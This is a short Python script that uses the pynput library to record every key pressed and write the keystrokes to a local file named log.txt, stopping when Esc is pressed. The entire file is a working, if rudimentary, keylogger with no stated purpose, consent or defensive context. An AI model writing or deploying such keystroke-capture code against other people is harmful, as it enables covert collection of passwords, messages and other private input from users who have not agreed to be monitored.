import pynput
from pynput.keyboard import Key, Listener
k=[]

def on_press(key):
    k.append(key)
    write_1(k)
    #print(key)
def write_1(var):
    with open("log.txt","w") as f:
        for i in var:
            n_var=str(i).replace("'",'')
            f.write(n_var)
            f.write(" ")
def on_release(key):
    if key==Key.esc:
        return False
with Listener(on_press=on_press,on_release=on_release) as l:
    l.join()
